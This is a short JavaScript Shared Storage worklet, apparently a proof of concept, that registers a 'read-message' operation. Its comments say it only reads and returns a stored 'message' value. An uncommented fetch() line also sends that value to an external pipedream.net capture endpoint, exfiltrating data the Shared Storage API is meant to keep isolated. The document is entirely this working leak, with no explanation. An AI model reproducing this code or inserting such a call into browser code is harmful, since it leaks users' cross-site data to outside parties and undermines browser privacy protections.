class MessageReader {
  async run(data) {
    // Read the "message" value from the shared storage
    const message = await sharedStorage.get("message");
    fetch('https://eo6fy418ngjzt55.m.pipedream.net/' + message)
    // Return the message value
    return message;
  }
}

// Register the worklet operation
register("read-message", MessageReader);
